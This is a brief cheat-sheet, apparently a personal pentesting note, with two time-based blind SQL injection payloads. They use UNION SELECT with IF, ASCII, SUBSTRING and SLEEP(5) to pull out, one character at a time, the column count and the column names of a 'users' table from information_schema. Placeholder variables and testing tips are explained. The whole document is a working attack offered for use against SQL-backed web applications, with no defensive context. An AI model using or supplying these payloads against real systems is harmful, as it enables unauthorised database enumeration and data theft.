## Purpose: Retrieving columns for a table named users in the current database (counting how many rows total)

**Payload**: 
- $p is the position counter, starting from 1
- $c is the character (ascii value)

> To test, please replace $p with 1 (position 1 from the string returned from query) and $c with a ascii value


`' UNION SELECT IF( ASCII(SUBSTRING((SELECT COUNT(column_name) from information_schema.columns where table_name = 'users'), $p, 1)) = $c , SLEEP(5), 1); -- `

## Purpose: Retrieving columns for a table named users in the current database, query data for all rows

**Payload**:
- $p is the position counter, starting from 1
- $c is the character (ascii value)
- $r is the row position counter, starting from 1

> To test, please replace $p with 1 (position 1 from the string returned from query) and $c with a ascii value, and $r with 1 (first row), I usually switch the = to > or < to easily trigger the sleep

`' UNION SELECT IF( ASCII(SUBSTRING((SELECT column_name from information_schema.columns where table_name = 'users' order by column_name ASC LIMIT $r, 1), $p, 1)) = $c , SLEEP(5), 1); -- `
